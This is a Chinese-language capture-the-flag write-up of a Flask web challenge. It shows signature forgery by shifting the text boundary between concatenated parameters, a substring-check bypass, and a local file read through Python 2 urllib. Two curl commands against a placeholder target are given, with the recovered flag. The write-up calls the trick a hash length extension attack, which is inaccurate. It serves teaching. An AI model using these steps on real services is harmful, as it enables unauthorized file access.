---
title: "[De1CTF 2019]SSRF Me"
platform: BUUCTF
category: Web
difficulty: 中等
tags: [ssrf, hash-length-extension, python2, flask]
vulnerability: Hash长度扩展攻击绕过签名验证，结合SSRF读取本地文件
solved: true
flag: "flag{38d865e6-6677-447a-a9df-ce6017f6a896}"
---

# [De1CTF 2019]SSRF Me

## 题目概述
Flask 应用提供了两个关键端点：`/geneSign` 用于生成签名，`/De1ta` 用于执行 SSRF 操作。签名验证使用 `md5(secret + param + action)` 的形式，存在 Hash 长度扩展攻击漏洞。

## 信息收集
访问首页直接返回源码，关键发现：
- `getSign(action, param) = md5(secret_key + param + action)`
- `/geneSign` 固定 `action="scan"`，可获取任意 param 的签名
- `/De1ta` 的 `action` 和 `sign` 来自 Cookie，`param` 来自 GET 参数
- WAF 仅过滤 `gopher://` 和 `file://` 协议
- `scan` 函数使用 Python 2 的 `urllib.urlopen()`，支持直接读取本地文件路径

## 漏洞分析（漏洞类型、原理、判断过程）

### 漏洞1：Hash长度扩展攻击
签名计算方式：`md5(secret + param + action)`

关键代码：
```python
def getSign(action, param):
    return hashlib.md5(secert_key + param + action).hexdigest()
```

由于 `action` 和 `param` 是字符串拼接，我们可以通过控制参数位置实现签名伪造：
- `geneSign`: `sign = md5(secret + param + "scan")`
- `De1ta`: `checkSign = md5(secret + param + action)`

如果设置：
- `geneSign` 的 `param = "/app/flag.txtread"`
- `De1ta` 的 `param = "/app/flag.txt"`, `action = "readscan"`

则两个 hash 计算结果相同：
- `md5(secret + "/app/flag.txtread" + "scan")` = `md5(secret + "/app/flag.txtreadscan")`
- `md5(secret + "/app/flag.txt" + "readscan")` = `md5(secret + "/app/flag.txtreadscan")`

### 漏洞2：SSRF 读取本地文件
`scan` 函数使用 `urllib.urlopen(param)`，Python 2 支持直接传入本地文件路径（无需 `file://` 协议），绕过 WAF。

### 漏洞3：action 检查逻辑缺陷
```python
if "scan" in self.action:  # 执行 scan
if "read" in self.action:  # 执行 read
```
使用 `in` 而非 `==`，`action="readscan"` 同时满足两个条件。

## 利用过程（Payload + Flag）

**Step 1: 获取签名**
```bash
curl -s "http://target/geneSign?param=/app/flag.txtread"
# 返回: 94f3787e59ed1a5658545f3eec82bcc7
```

**Step 2: 利用 SSRF 读取 flag**
```bash
curl -s "http://target/De1ta?param=/app/flag.txt" \
  -H "Cookie: action=readscan; sign=94f3787e59ed1a5658545f3eec82bcc7"
# 返回: {"code": 200, "data": "flag{38d865e6-6677-447a-a9df-ce6017f6a896}\n"}
```

**Flag:** `flag{38d865e6-6677-447a-a9df-ce6017f6a896}`

## 复现步骤
1. 访问 `/geneSign?param=/app/flag.txtread` 获取签名
2. 访问 `/De1ta?param=/app/flag.txt`，设置 Cookie `action=readscan; sign=<签名>`
3. 响应中获取 flag

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| Hash长度扩展攻击 | `/geneSign` + `/De1ta` | `param=xxxread`, `action=readscan` | MD5 拼接顺序利用 |
| SSRF | `urllib.urlopen()` | 直接使用文件路径 `/app/flag.txt` | Python 2 urllib 特性 |
| 逻辑缺陷 | action 检查 | `"scan" in action` | 字符串包含判断绕过 |

## 知识总结

1. **Hash 长度扩展攻击变体**：当 hash 计算为 `md5(secret + A + B)` 形式时，如果能控制 A 和 B 的边界，就能伪造签名

2. **Python 2 urllib 特性**：`urllib.urlopen()` 支持直接传入本地文件路径，无需 `file://` 协议前缀

3. **字符串检查陷阱**：使用 `in` 检查而非精确匹配时，可通过组合字符串绕过限制

4. **WAF 绕过思路**：协议被过滤时，尝试不使用协议前缀直接访问资源
